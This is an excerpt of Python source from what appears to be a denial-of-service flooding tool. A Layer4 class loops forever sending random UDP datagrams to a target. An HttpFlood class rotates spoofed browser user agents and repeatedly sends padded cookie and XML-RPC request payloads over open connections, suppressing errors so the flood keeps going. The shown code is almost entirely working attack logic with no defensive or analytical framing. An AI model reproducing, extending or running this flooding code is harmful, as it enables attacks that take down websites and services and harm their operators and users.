...
class Layer4(Thread):
    ...
    def UDP(self) -> None:
        ...
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1999), self._target):
                continue
        Tools.safe_close(s)
...
class HttpFlood(Thread):
    ...
    def __init__(self,
        ...
        if not useragents:
            useragents: List[str] = [
                ...
                'Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20222201 Firefox/69.0',
    ...
    def COOKIES(self) -> None:
        payload: bytes = self.generate_payload(
            ...
            " %s=%s\r\n" %
            (ProxyTools.Random.rand_int(10003, 99999), ProxyTools.Random.rand_str(6),
             ProxyTools.Random.rand_str(577)))
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
    ...
    def XMLRPC(self) -> None:
        payload: bytes = self.generate_payload(
            ...
            (ProxyTools.Random.rand_str(577),
             ProxyTools.Random.rand_str(577)))[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
